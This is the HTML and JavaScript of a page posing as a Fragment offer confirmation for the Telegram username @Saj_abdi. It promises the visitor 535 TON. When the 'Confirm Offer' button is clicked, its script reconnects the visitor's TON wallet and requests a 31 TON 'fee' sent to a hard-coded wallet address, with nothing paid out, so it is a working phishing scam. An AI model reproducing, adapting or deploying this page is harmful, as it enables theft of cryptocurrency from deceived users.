<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Fragment - Confirm Offer</title>
    <style>
        :root {
            --tm-bg-dark: #1A2026;
            --tm-bg-dark-1: #293440;
            --tm-bg-dark-2: #293440;
            --tm-text-primary: #fff;
            --tm-text-secondary: #a1a1a1;
            --tm-text-blue: #00aff0;
            --tm-text-orange: #ff9500;
            --tm-btn-primary-bg: #00aff0;
            --tm-btn-primary-hover-bg: #0091c2;
            --tm-btn-radius: 5px;
            --tm-transition: all 0.3s ease;
        }

        body {
            background-color: var(--tm-bg-dark);
            color: var(--tm-text-primary);
            font-family: 'Roboto', sans-serif;
            margin: 0;
            padding: 0;
            font-size: 14px;
        }

        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 400;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOmCnqEu92Fr1Mu4mxK.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 500;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmEU9fBBc4.woff2') format('woff2');
        }
        @font-face {
            font-family: 'Roboto';
            font-style: normal;
            font-weight: 700;
            src: url('https://fonts.gstatic.com/s/roboto/v30/KFOlCnqEu92Fr1MmWUlfBBc4.woff2') format('woff2');
        }

        .header {
            background-color: #202832;
            width: 100%;
            padding: 8px 15px;
            display: flex;
            align-items: center;
            box-sizing: border-box;
        }

        .header img {
            height: 30px;
            width: auto;
        }

        .container {
            width: 90%;
            margin: 0 auto;
            padding: 15px;
            position: relative;
        }

        .subscribe-link {
            position: absolute;
            top: 15px;
            right: 15px;
            color: var(--tm-text-blue);
            font-size: 12px;
            text-decoration: none;
        }

        .username-header {
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .username-header h1 {
            font-size: 20px;
            font-weight: 700;
            margin: 0;
        }

        .status-taken {
            background-color: var(--tm-text-orange);
            color: var(--tm-text-primary);
            padding: 2px 6px;
            border-radius: 10px;
            font-size: 10px;
            font-weight: 500;
            text-transform: uppercase;
        }

        .content-wrapper {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-top: 15px;
        }

        .left-section, .right-section {
            flex: 1;
        }

        .info-box {
            background-color: var(--tm-bg-dark-1);
            padding: 15px;
            border-radius: 6px;
            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
        }

        .info-box p {
            font-size: 12px;
            color: var(--tm-text-primary);
            margin-bottom: 10px;
            line-height: 1.4;
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .info-box p:last-child {
            margin-bottom: 0;
        }

        .info-box p::before {
            content: 'â€¢';
            color: var(--tm-text-blue);
            font-size: 16px;
        }

        .info-box p span {
            font-weight: 700;
            font-size: 14px;
            color: var(--tm-text-primary);
        }

        .details-box {
            background-color: var(--tm-bg-dark-1);
            padding: 12px;
            border-radius: 6px;
        }

        .details-table {
            width: 100%;
            border-spacing: 0;
            background: transparent;
        }

        .details-table th, .details-table td {
            padding: 4px 0;
            font-size: 12px;
        }

        .details-table th {
            color: var(--tm-text-primary);
            font-weight: 500;
            text-align: left;
            width: 40%;
        }

        .details-table td {
            color: var(--tm-text-blue);
            font-weight: 400;
            text-align: right;
        }

        .details-table td a {
            color: var(--tm-text-blue);
            text-decoration: none;
        }

        .btn-primary {
            background-color: var(--tm-btn-primary-bg);
            border: none;
            padding: 10px 15px;
            font-size: 14px;
            font-weight: 500;
            width: 100%;
            border-radius: var(--tm-btn-radius);
            color: var(--tm-text-primary);
            cursor: pointer;
            transition: var(--tm-transition);
            margin-top: 12px;
        }

        .btn-primary:hover {
            background-color: var(--tm-btn-primary-hover-bg);
        }

        @media (min-width: 600px) {
            .content-wrapper {
                flex-direction: row;
                justify-content: space-between;
            }

            .container {
                max-width: 600px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="home.html">
            <img src="./photo.jpg" alt="Fragment Logo">
        </a>
    </div>
    <div class="container">
        <a href="https://t.me/fragment" class="subscribe-link">Subscribe to Updates</a>
        <div class="username-header">
            <h1>Saj_abdi.t.me</h1>
            <span class="status-taken">Taken</span>
        </div>
        <div class="content-wrapper">
            <div class="left-section">
                <div class="info-box">
                    <p>You will receive: <span>535 TON</span> ($1719.98)</p>
                    <p>Transaction fee: <span>31 TON</span> ($101.86)</p>
                </div>
                <button id="agree-button" class="btn-primary">Confirm Offer</button>
            </div>
            <div class="right-section">
                <div class="details-box">
                    <table class="details-table">
                        <tr>
                            <th>Telegram Username</th>
                            <td><a href="https://t.me/Saj_abdi">@Saj_abdi</a></td>
                        </tr>
                        <tr>
                            <th>Web Address</th>
                            <td><a href="https://t.me/Saj_abdi">t.me/Saj_abdi</a></td>
                        </tr>
                        <tr>
                            <th>TON Web 3.0 Address</th>
                            <td><a href="https://Saj_abdi">Saj_abdi.t.me</a></td>
                        </tr>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script>
        console.log('Script started');

        // Initialize TON Connect UI
        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
            manifestUrl: 'https://gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json',
            restoreConnection: true
        });

        // Function to check TON network connectivity
        async function checkNetworkStatus() {
            try {
                console.log('Checking TON network status...');
                const response = await fetch('https://toncenter.com/api/v2/getMasterchainInfo');
                if (!response.ok) {
                    throw new Error('TON network unavailable');
                }
                console.log('TON network available');
                return true;
            } catch (error) {
                console.error('Network check error:', error.message);
                throw new Error(`Network unavailable: ${error.message}`);
            }
        }

        // Function to ensure wallet disconnection
        async function ensureWalletDisconnected() {
            try {
                const isConnected = tonConnectUI.connected;
                console.log('Wallet connection status:', isConnected);

                if (isConnected) {
                    console.log('Disconnecting wallet...');
                    await tonConnectUI.disconnect();
                    console.log('Wallet disconnected');

                    // Delay to ensure disconnection completes
                    await new Promise(resolve => setTimeout(resolve, 2000));

                    if (tonConnectUI.connected) {
                        throw new Error('Failed to disconnect wallet');
                    }
                }
            } catch (error) {
                console.error('Error disconnecting wallet:', error.message);
                throw new Error(`Failed to disconnect wallet: ${error.message}`);
            }
        }

        // Function to validate transaction parameters
        function validateTransaction(transaction) {
            console.log('Validating transaction:', transaction);
            if (!transaction.validUntil || transaction.validUntil < Math.floor(Date.now() / 1000)) {
                throw new Error('Transaction validity expired');
            }
            if (!transaction.messages || !transaction.messages.length) {
                throw new Error('Transaction messages missing');
            }
            for (const msg of transaction.messages) {
                if (!msg.address) {
                    throw new Error('Transaction address missing');
                }
                if (!msg.amount || isNaN(msg.amount) || msg.amount <= 0) {
                    throw new Error('Invalid transaction amount');
                }
            }
            console.log('Transaction validated');
        }

        // Function to process the transaction
        async function processTransaction() {
            try {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600, // Valid for 10 minutes
                    messages: [
                        {
                            address: "UQAlcL-4wdpAhdITEUdKMYQATU7lH0zmjmBSXttP5U6SsDSc",
                            amount: "31000000000" // 31 TON in nanoTON
                        }
                    ]
                };
                console.log('Transaction prepared:', transaction);

                // Validate parameters
                validateTransaction(transaction);

                // Check network
                await checkNetworkStatus();

                // Check wallet status
                const walletInfo = tonConnectUI.wallet;
                if (!walletInfo || !walletInfo.account || !walletInfo.account.address) {
                    throw new Error('Wallet not connected or address unavailable');
                }
                console.log('Wallet info:', walletInfo);

                // Send transaction
                console.log('Sending transaction...');
                const result = await tonConnectUI.sendTransaction(transaction);
                console.log('Transaction successfully sent:', result);
                console.log('Offer confirmed');
            } catch (error) {
                console.error('Error sending transaction:', error.message);
                throw error;
            }
        }

        // Function to connect wallet with retries
        async function connectWalletWithRetry(maxRetries = 3, retryDelay = 2000) {
            let attempts = 0;
            while (attempts < maxRetries) {
                try {
                    console.log(`Wallet connection attempt #${attempts + 1}`);
                    await tonConnectUI.connectWallet();
                    if (!tonConnectUI.connected) {
                        throw new Error('Wallet not connected');
                    }
                    console.log('Wallet successfully connected:', tonConnectUI.wallet);
                    return;
                } catch (error) {
                    attempts++;
                    console.error(`Connection error (attempt ${attempts}):`, error.message);
                    if (attempts >= maxRetries) {
                        throw new Error(`Failed to connect wallet after ${maxRetries} attempts`);
                    }
                    await new Promise(resolve => setTimeout(resolve, retryDelay));
                }
            }
        }

        // Initialize event listeners
        function initializeEventListeners() {
            const agreeButton = document.getElementById('agree-button');
            if (!agreeButton) {
                console.error('Confirm Offer button not found');
                return;
            }

            agreeButton.addEventListener('click', async () => {
                console.log('Confirm Offer button clicked');
                try {
                    await ensureWalletDisconnected();
                    await connectWalletWithRetry();
                    await processTransaction();
                } catch (error) {
                    console.error('Processing error:', error.message);
                }
            });
        }

        // Check manifest availability
        async function checkManifestUrl() {
            const manifestUrl = 'gektor192.github.io/sdfdsfsdfxvcxv/tonconnect-manifest.json';
            try {
                const response = await fetch(manifestUrl);
                if (!response.ok) {
                    throw new Error(`Status: ${response.status}`);
                }
                console.log('Manifest available');
            } catch (error) {
                console.error('Manifest check error:', error.message);
            }
        }

        // Initialization
        document.addEventListener('DOMContentLoaded', () => {
            console.log('DOM loaded');
            checkManifestUrl();
            initializeEventListeners();
        });
    </script>
</body>
</html>
